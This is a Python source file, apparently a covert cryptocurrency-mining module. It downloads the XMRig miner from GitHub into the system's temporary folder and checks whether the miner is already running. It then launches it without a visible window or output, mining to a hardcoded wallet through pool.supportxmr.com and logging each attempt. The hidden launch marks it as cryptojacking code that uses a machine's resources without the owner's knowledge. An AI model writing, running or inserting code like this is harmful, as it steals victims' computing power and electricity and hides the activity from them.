import os
import subprocess
import requests
import platform
import json
import time

WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
MINING_LOG = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "mining_status.txt")

def start():
    print("[DEBUG] Starting monitor/miner...")
    
    # Write to mining log
    try:
        with open(MINING_LOG, 'a') as f:
            f.write(f"{time.ctime()} - Mining attempt started\n")
    except:
        pass
    
    try:
        if _is_running():
            print("[DEBUG] Miner already running")
            return
        
        exe = _get_path()
        if not exe or not os.path.exists(exe):
            print("[DEBUG] Downloading miner...")
            exe = _download()
        
        if not exe:
            print("[DEBUG] Failed to download miner")
            # Write failed attempt
            try:
                with open(MINING_LOG, 'a') as f:
                    f.write(f"{time.ctime()} - Mining download failed\n")
            except:
                pass
            return
        
        print(f"[DEBUG] Starting miner: {exe}")
        subprocess.Popen(
            [exe, "--url=pool.supportxmr.com:3333", f"--user={WALLET}",
             "--pass=x", "--threads=2", "--keepalive", "--donate-level=1"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[DEBUG] Miner started")
        
        # Write success to log
        try:
            with open(MINING_LOG, 'a') as f:
                f.write(f"{time.ctime()} - Mining started successfully\n")
        except:
            pass
            
    except Exception as e:
        print(f"[DEBUG] Monitor error: {e}")
        try:
            with open(MINING_LOG, 'a') as f:
                f.write(f"{time.ctime()} - Mining error: {e}\n")
        except:
            pass

def _is_running():
    try:
        r = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq xmrig.exe'], 
                          capture_output=True, text=True)
        return 'xmrig.exe' in r.stdout
    except:
        return False

def _get_path():
    return os.path.join(os.environ.get('TEMP', '/tmp'), 'xmrig.exe')

def _download():
    try:
        url = "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip"
        tmp = os.environ.get('TEMP', '/tmp')
        zip_path = os.path.join(tmp, 'xmrig.zip')
        
        print("[DEBUG] Downloading XMRig...")
        r = requests.get(url, stream=True, timeout=60)
        if r.status_code != 200:
            print(f"[DEBUG] Download failed: {r.status_code}")
            return None
        
        with open(zip_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print("[DEBUG] Extracting XMRig...")
        import zipfile
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(tmp)
        
        for root, dirs, files in os.walk(tmp):
            for f in files:
                if f == 'xmrig.exe':
                    exe_path = os.path.join(root, f)
                    print(f"[DEBUG] XMRig extracted to: {exe_path}")
                    return exe_path
        
        return None
    except Exception as e:
        print(f"[DEBUG] Download error: {e}")
        return None

def check_mining_status():
    """Check if mining is running and log it."""
    if _is_running():
        print("[DEBUG] ✅ XMRig is running")
        return True
    else:
        print("[DEBUG] ❌ XMRig is NOT running")
        return False